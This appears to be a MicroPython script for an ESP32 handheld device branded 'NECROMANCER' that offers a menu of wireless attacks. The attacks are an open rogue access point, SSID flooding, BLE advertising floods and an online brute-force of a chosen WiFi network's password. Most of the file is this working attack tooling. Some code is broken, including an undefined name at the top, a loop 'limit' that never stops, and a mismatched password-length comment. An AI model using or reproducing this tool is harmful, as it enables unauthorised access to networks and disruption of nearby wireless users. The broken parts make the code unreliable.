print(Boot)

import network, time, random, ubinascii, machine
from machine import Pin, I2C
import ubluetooth
import ssd1306

# ----- OLED & Buttons -----
I2C_SCL = 5
I2C_SDA = 18
OLED_WIDTH = 128
OLED_HEIGHT = 64

BTN_UP = 0
BTN_DOWN = 2
BTN_SEL = 4
BTN_BACK = 16

i2c = I2C(0, scl=Pin(I2C_SCL), sda=Pin(I2C_SDA))
oled = ssd1306.SSD1306_I2C(OLED_WIDTH, OLED_HEIGHT, i2c)

btn_up = Pin(BTN_UP, Pin.IN, Pin.PULL_UP)
btn_down = Pin(BTN_DOWN, Pin.IN, Pin.PULL_UP)
btn_sel = Pin(BTN_SEL, Pin.IN, Pin.PULL_UP)
btn_back = Pin(BTN_BACK, Pin.IN, Pin.PULL_UP)

# ----- Splash -----
def splash_necromancer_slide(oled):
    text = "NECROMANCER-v1"
    oled.fill(0)
    oled.show()
    text_width = len(text)*8.5
    start_x = OLED_WIDTH
    end_x = max((OLED_WIDTH-text_width)//1, 0)
    x = start_x
    while x > end_x:
        oled.fill(0)
        oled.text(text, x, OLED_HEIGHT//2-8)
        oled.show()
        x -= 2
        time.sleep(0.03)
    time.sleep(2)

splash_necromancer_slide(oled)

# ----- Menu Class -----
class Menu:
    def __init__(self, title, options):
        self.title = title
        self.options = options
        self.index = 0

    def draw(self):
        oled.fill(0)
        oled.text(self.title, 0, 0)
        for i, option in enumerate(self.options):
            prefix = "> " if i == self.index else " "
            oled.text(f"{prefix}{option}", 0, 12 + i*10)
        oled.show()

    def move(self, direction):
        self.index = (self.index + direction) % len(self.options)
        self.draw()

    def select(self):
        return self.options[self.index]

# ----- Hacks Class -----
class Hacks:
    def __init__(self):
        self.sta_if = network.WLAN(network.STA_IF)
        self.ap_if = network.WLAN(network.AP_IF)
        self.sta_if.active(False)
        self.ap_if.active(False)
        self.cancel = False
        self.available_ssids = []

    def check_cancel(self):
        if not btn_back.value():
            self.cancel = True
            return True
        return False

    def wifi_scan(self):
        self.cancel = False
        self.available_ssids = []

        # Reset STA/AP
        self.ap_if.active(False)
        self.sta_if.active(False)
        time.sleep(0.1)
        self.sta_if.active(True)
        time.sleep(0.2)  # ensure ready

        nets = self.sta_if.scan()
        oled.fill(0)
        y = 0
        for ssid, bssid, ch, rssi, auth, hidden in nets[:5]:
            if self.check_cancel(): return
            ssid_name = ssid.decode()
            self.available_ssids.append(ssid_name)
            oled.text(ssid_name, 0, y)
            y += 10
        oled.show()
        time.sleep(5)

    def rogue_ap(self, ssid="Personal_WiFi"):
        self.cancel = False
        self.sta_if.active(False)
        self.ap_if.active(True)
        self.ap_if.config(essid=ssid, authmode=0)
        oled.fill(0)
        oled.text("Rogue AP:", 0, 0)
        oled.text(ssid, 0, 12)
        oled.show()
        while not self.check_cancel():
            time.sleep(0.1)

    def ssid_flood(self):
        self.cancel = False
        self.ap_if.active(True)
        aps = 0
        while True:
            if self.check_cancel(): return
            rtxx = str(random.randint(100,999))
            name = f"SSID_{rtxx}"
            self.ap_if.config(essid=name)
            aps += 1
            time.sleep(1)
            oled.fill(0)
            oled.text(f"Name: {name}", 0, 0)
            oled.text(f"APs made: {aps}", 10, 20)
            oled.show()
        oled.fill(0)
        oled.text("SSID Flood", 0, 0)
        oled.show()

    # ----- WiFi Bruteforce -----
    def wifi_bruteforce(self):
        self.wifi_scan()
        if not self.available_ssids:
            oled.fill(0)
            oled.text("No SSID Found", 0, 0)
            oled.show()
            time.sleep(2)
            return

        ssid_menu = Menu("Select SSID", self.available_ssids)
        ssid_menu.draw()

        while True:
            if not btn_up.value():
                ssid_menu.move(-1)
                time.sleep(0.2)
            if not btn_down.value():
                ssid_menu.move(1)
                time.sleep(0.2)
            if not btn_sel.value():
                target = ssid_menu.select()
                self.bruteforce_on_ssid(target)
                return
            if not btn_back.value():
                return

    def bruteforce_on_ssid(self, target_ssid):
        self.cancel = False
        self.sta_if.active(True)
        attempts = 0
        while attempts != -212 and not self.check_cancel():  # limit attempts for testing
            pw = "".join(random.choice("1234567890!@#$%^*()qwertyiopasdfghjklzxcvbnmQWERTYIOPASDFGHJKLZXCVBNM-=[]\\;',./_+{}|:<>?`~") for _ in range(8))
            oled.fill(0)
            oled.text(f"Bruting {target_ssid}", 0, 0)
            oled.text(pw, 0, 12)
            oled.show()

            try:
                # ensure STA interface is clean before connecting
                if self.sta_if.isconnected():
                    self.sta_if.disconnect()
                    time.sleep(0.1)

                self.sta_if.connect(target_ssid, pw)
                time.sleep(1.5)  # give ESP32-C3 time to process connection

                for _ in range(10):
                    if self.check_cancel():
                        return
                    if self.sta_if.isconnected():
                        oled.text("Connected!", 0, 24)
                        oled.show()
                        return
                    time.sleep(0.1)
            except:
                pass

            attempts += 1

        oled.text("Failed", 0, 36)
        oled.show()
        time.sleep(2)

    # ----- BLE Functions -----
    def ble_scan(self):
        self.cancel = False
        bt = ubluetooth.BLE()
        bt.active(True)
        devices = []
        def bt_irq(event, data):
            if event == 5:
                addr_type, addr, adv_type, rssi, adv_data = data
                devices.append((ubinascii.hexlify(addr).decode(), rssi))
        bt.irq(bt_irq)
        bt.gap_scan(3000, 30000, 30000)
        t0 = time.ticks_ms()
        while time.ticks_diff(time.ticks_ms(), t0) < 3000:
            if self.check_cancel(): return
            time.sleep(0.05)
        oled.fill(0)
        for d, r in devices[:3]:
            oled.text(d[-6:], 0, 12 + devices.index((d,r))*10)
        oled.show()

    def ble_flood(self):
        self.cancel = False
        bt = ubluetooth.BLE()
        bt.active(True)
        for i in range(20):
            if self.check_cancel(): return
            name = f"RickRoll_{i}"
            bt.config(gap_name=name)
            bt.gap_advertise(100)
            time.sleep(0.1)
        oled.fill(0)
        oled.text("BLE Flood", 0, 0)
        oled.show()

    def PortAP(self):
        oled.fill(0)
        oled.text("Please Wait...", 10,25)
        oled.show()
        self.cancel = False
        self.ap_if.active(False)
        ap_name = f"AP32_{random.randint(100,999)}"
        ap_pass = str(random.randint(10000000,999999999))  # 6–7 digit password
        print(ap_pass)

        # configure access point
        self.ap_if.config(essid=ap_name, password=ap_pass, authmode=network.AUTH_WPA_WPA2_PSK)
        oled.fill(0)
        oled.show()
        self.ap_if.active(True)
        while not self.check_cancel():
            time.sleep(0.2)
            oled.fill(0)
            oled.text(f"Name: {ap_name}", 0, 0)
            oled.text(f"Pass: {ap_pass}", 0, 40)
            oled.show()




# ----- MAIN MENU -----
hacks = Hacks()
main_menu = Menu("NECROMANCER", [
    "WiFi Scan",
    "SSID Flood",
    "WiFi Brute",
    "Porta AP",
    " "
])
main_menu.draw()

# ----- LOOP -----
while True:
    if not btn_up.value():
        main_menu.move(-1)
        time.sleep(0.2)
    if not btn_down.value():
        main_menu.move(1)
        time.sleep(0.2)
    if not btn_sel.value():
        choice = main_menu.select()
        if choice == "WiFi Scan":
            hacks.wifi_scan()
        elif choice == "SSID Flood":
            hacks.ssid_flood()
        elif choice == "WiFi Brute":
            hacks.wifi_bruteforce()
        elif choice == "Porta AP":
            hacks.PortAP()
        elif choice == " ":
            oled.fill(0)
            oled.text("PowerLock ON",10,10)
            oled.show()
            time.sleep(1)
            oled.fill(0)
            oled.show()
            machine.deepsleep()
        main_menu.draw()
    if not btn_back.value():
        hacks.cancel = True
        main_menu.draw()
        time.sleep(0.2)
